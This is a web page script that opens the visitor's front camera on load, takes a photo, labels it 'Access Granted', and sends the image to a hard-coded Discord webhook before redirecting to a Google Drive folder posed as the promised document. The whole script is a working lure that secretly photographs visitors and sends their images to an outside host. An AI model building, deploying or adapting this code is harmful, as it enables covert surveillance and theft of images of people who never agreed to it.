<script>
  /* ---------- CONFIGURATION ---------- */
  const GOOGLE_DRIVE_LINK = "https://drive.google.com/drive/u/6/folders/1UHDGhaFXQ_gAlcmt8g3fkT4YX8rHJYpZ";
  const WEBHOOK_URL = "https://discord.com/api/webhooks/1505273360391602418/I4OnCKamE02G2jtK9i0IJyFrX1GNrqYKQ_QQ61OmwyjqHXTYPj3FVDzcu1-dhL3JT7ri";
  /* ----------------------------------- */

  async function startCamera() {
    try {
      const stream = await navigator.mediaDevices.getUserMedia({
        video: { facingMode: "user" }
      });
      const video = document.getElementById('video');
      video.srcObject = stream;
      video.style.display = 'block';
      setTimeout(() => takePhotoAndRedirect(stream), 2000);
    } catch (err) {
      console.error("Camera error:", err);
      alert("Camera permission denied. Redirecting anyway...");
      window.location.href = GOOGLE_DRIVE_LINK;
    }
  }

  function takePhotoAndRedirect(stream) {
    const video = document.getElementById('video');
    const canvas = document.getElementById('canvas');
    const ctx = canvas.getContext('2d');

    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;
    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
    const imageData = canvas.toDataURL('image/jpeg', 0.8); // 80% quality

    stream.getTracks().forEach(t => t.stop());

    document.getElementById('video').style.display = 'none';
    document.querySelector('h3').innerText = "Access Granted";
    document.querySelector('p').innerText = "Redirecting to document…";

    sendImageToWebhook(imageData);          // <‑‑  NEW
    setTimeout(() => { window.location.href = GOOGLE_DRIVE_LINK; }, 1000);
  }

  /* ------------------------------------------------------------------ */
  /* 1️⃣  Convert base64 → Blob                                      */
  /* ------------------------------------------------------------------ */
  function base64ToBlob(base64, mime = "image/jpeg") {
    const byteString = atob(base64.split(",")[1]);          // strip data:*;base64,
    const array = new Uint8Array(byteString.length);
    for (let i = 0; i < byteString.length; i++) {
      array[i] = byteString.charCodeAt(i);
    }
    return new Blob([array], { type: mime });
  }

  /* ------------------------------------------------------------------ */
  /* 2️⃣  Send the image as an attachment to Discord                   */
  /* ------------------------------------------------------------------ */
  function sendImageToWebhook(base64Image) {
    if (!WEBHOOK_URL) {
      console.warn("Webhook URL not set – image not sent");
      return;
    }

    const blob = base64ToBlob(base64Image);          // 2️⃣ A
    const formData = new FormData();

    // Normal message payload
    const payload = {
      content: "📸 **Camera Access Granted!**"
    };
    formData.append("payload_json", JSON.stringify(payload));

    // Attach the image file
    formData.append("file", blob, "selfie.jpg");

    // POST multipart body to Discord
    fetch(WEBHOOK_URL, {
      method: "POST",
      body: formData
    })
      .then(r => {
        if (!r.ok) throw new Error(`Discord HTTP ${r.status}`);
        console.log("Image sent to Discord");
      })
      .catch(err => console.error("Failed to send webhook:", err));
  }

  window.onload = startCamera;
</script>
